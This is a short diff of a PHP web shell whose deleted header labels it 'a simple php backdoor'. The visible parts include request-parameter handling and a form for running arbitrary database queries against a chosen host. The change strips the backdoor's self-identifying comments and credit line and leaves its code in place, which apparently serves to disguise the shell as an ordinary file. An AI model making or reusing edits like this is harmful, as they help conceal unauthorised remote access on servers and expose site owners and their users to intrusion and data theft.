@@ -1,5 +1,5 @@
 <?
-// a simple php backdoor | coded by z0mbie [30.08.03] | http://freenet.am/~zombie \\
+
 
 ob_implicit_flush();
 if(isset($_REQUEST['f'])){
@@ -68,4 +68,4 @@ host:<input type="text" name="host"value="localhost">  user: <input type="text" 
 database: <input type="text" name="db">  query: <input type="text" name="mquery"> <input type="submit" value="execute">
 </form>
 
-<!--	http://michaeldaw.org	2006 	-->
+
